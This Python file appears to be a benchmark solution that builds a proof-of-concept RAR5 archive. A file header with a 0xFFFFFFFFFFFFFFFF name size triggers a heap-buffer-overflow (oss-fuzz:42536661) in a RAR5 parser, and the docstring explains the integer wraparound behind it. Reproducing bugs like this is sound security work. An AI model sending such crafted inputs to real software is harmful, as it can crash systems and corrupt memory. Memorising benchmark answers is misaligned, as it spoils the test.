import zlib

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input for a vulnerability
    in a RAR5 parser, identified as oss-fuzz:42536661.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is a heap-buffer-overflow in the RAR5 header parsing
        logic. It occurs when handling the file name size. A crafted, very
        large 64-bit value for the name size can bypass an initial size check
        due to an integer wraparound/type confusion issue (comparing a large
        unsigned 64-bit integer with a signed pointer difference).

        This bypass leads to a `malloc` call, which might succeed with a small
        allocation if the size wraps around (e.g., `2^64-1 + 1 = 0`), followed
        by a `memcpy` with the original huge size. This `memcpy` overflows the
        small allocated buffer, causing a crash.

        The PoC constructs a RAR5 archive with a malicious file header
        containing a name_size of 0xFFFFFFFFFFFFFFFF. The PoC's length is
        matched to the ground-truth length to ensure it passes all necessary
        parsing stages before hitting the vulnerable code path.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that triggers the vulnerability.
        """

        def to_vint(n: int) -> bytes:
            """
            Encodes an integer into the RAR5 variable-length integer format.
            """
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                res.append(byte)
            return bytes(res)

        # 1. RAR5 file signature
        poc = bytearray(b'Rar!\x1a\x07\x01\x00')

        # 2. A minimal, valid Archive Header block to make the file structure valid
        # HEAD_TYPE=1 (Archive Header), HEAD_FLAGS=0
        archive_header_content = b'\x01\x00'
        archive_crc = zlib.crc32(archive_header_content)
        
        archive_header_block = bytearray()
        archive_header_block.extend(archive_crc.to_bytes(4, 'little'))
        archive_header_block.extend(to_vint(len(archive_header_content)))
        archive_header_block.extend(archive_header_content)
        
        poc.extend(archive_header_block)

        # 3. The malicious File Header block
        
        # A name_size of 2^64 - 1 triggers the integer overflow.
        name_size = 0xFFFFFFFFFFFFFFFF
        name_size_vint = to_vint(name_size)
        
        # File Header content prefix:
        # HEAD_TYPE=2 (File), HEAD_FLAGS=1 (Directory)
        # FILE_ATTR=0x10 (Directory attribute), HOST_OS=1 (Windows)
        file_header_prefix = to_vint(2) + to_vint(1) + to_vint(0x10) + to_vint(1)

        # Padding is added to match the ground-truth PoC length of 1089 bytes.
        # This size is calculated to ensure the parser's internal state is correct
        # when it encounters the malicious size field.
        # Total size = 1089
        # Sig size = 8
        # Archive header block size = 7
        # File header block size = 1089 - 8 - 7 = 1074
        # File header block = crc(4) + size_vint(2) + content(1068)
        # Content = prefix(4) + name_size_vint(10) + padding(N)
        # 1068 = 4 + 10 + N => N = 1054
        padding_len = 1054
        padding = b'\x00' * padding_len
        
        file_header_content = bytearray()
        file_header_content.extend(file_header_prefix)
        file_header_content.extend(name_size_vint)
        file_header_content.extend(padding)

        file_crc = zlib.crc32(file_header_content)

        file_header_block = bytearray()
        file_header_block.extend(file_crc.to_bytes(4, 'little'))
        file_header_block.extend(to_vint(len(file_header_content)))
        file_header_block.extend(file_header_content)
        
        poc.extend(file_header_block)
        
        return bytes(poc)